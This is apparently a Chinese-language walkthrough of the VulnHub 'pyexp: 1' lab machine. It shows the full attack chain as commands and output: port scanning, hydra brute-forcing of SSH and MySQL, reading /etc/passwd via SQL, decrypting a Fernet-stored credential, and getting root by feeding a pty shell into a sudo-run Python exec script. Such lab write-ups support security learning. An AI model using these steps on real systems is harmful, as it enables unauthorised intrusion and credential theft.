靶机地址：[pyexp: 1 ~ VulnHub](https://vulnhub.com/entry/pyexp-1,534/)
主机发现、端口扫描、服务枚举
```Shell
sudo arp-scan -l
sudo nmap -p- 192.168.1.11
sudo nmap -p1337,3306 -sV 192.168.1.11
# 1337/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
# 3306/tcp open  mysql   MySQL 5.5.5-10.3.23-MariaDB-0+deb10u1
```
尝试搜索已知漏洞，并没有成功
尝试暴力破解
```Shell
hydra -l root -P /home/kali/Tools/Custom/rockyou.txt ssh://192.168.1.11:1337
hydra -l root -P /home/kali/Tools/Custom/rockyou.txt mysql://192.168.1.11
# [3306][mysql] host: 192.168.1.11   login: root   password: prettywoman
```
成功暴力破解出了 `MySQL` 的密码
尝试连接
```Shell
mysql -h 192.168.1.11 -u root -p
# prettywoman
```
尝试执行系统命令、读取文件
```SQL
SELECT do_system("id");
SELECT load_file('/etc/passwd');
```
执行系统命令失败，但是成功读取到了文件，内容 `grep "/bin/bash"` 后结果如下
```
root:x:0:0:root:/root:/bin/bash
lucy:x:1000:1000:lucy,,,:/home/lucy:/bin/bash
```
从数据库 `data` 中的表 `fernet` 获取到如下内容
```
# cred keyy
gAAAAABfMbX0bqWJTTdHKUYYG9U5Y6JGCpgEiLqmYIVlWB7t8gvsuayfhLOO_cHnJQF1_ibv14si1MbL7Dgt9Odk8mKHAXLhyHZplax0v02MMzh_z_eI7ys=
UJ5_V_b-TWKKyzlErA96f-9aEnQEfdjFbRKt8ULjdV0=
```
看上去就是加密过的内容，简单通过CyberChef试了一下，并没有解密成功
搜索引擎查一下fernet crypto，找到了官网
```Python
from cryptography.fernet import Fernet
key = b"UJ5_V_b-TWKKyzlErA96f-9aEnQEfdjFbRKt8ULjdV0="
f = Fernet(key)
cred = b"gAAAAABfMbX0bqWJTTdHKUYYG9U5Y6JGCpgEiLqmYIVlWB7t8gvsuayfhLOO_cHnJQF1_ibv14si1MbL7Dgt9Odk8mKHAXLhyHZplax0v02MMzh_z_eI7ys="
print(f.decrypt(cred))
```
输出如下
```
b'lucy:wJ9`"Lemdv9[FEw-'
```
尝试SSH
```Shell
ssh lucy@192.168.1.11 -p 1337
# wJ9`"Lemdv9[FEw-
```
成功登录系统，尝试提权
```Shell
sudo -l
# (root) NOPASSWD: /usr/bin/python2 /opt/exp.py
cat /opt/exp.py
# uinput = raw_input('how are you?')
# exec(uinput)
sudo /usr/bin/python2 /opt/exp.py
# import pty; pty.spawn("/bin/bash")
```
成功提权

尝试其它提权方式
[[20 CVE#CVE-2021-3156|CVE-2021-3156]] 可以通过Python代码提权

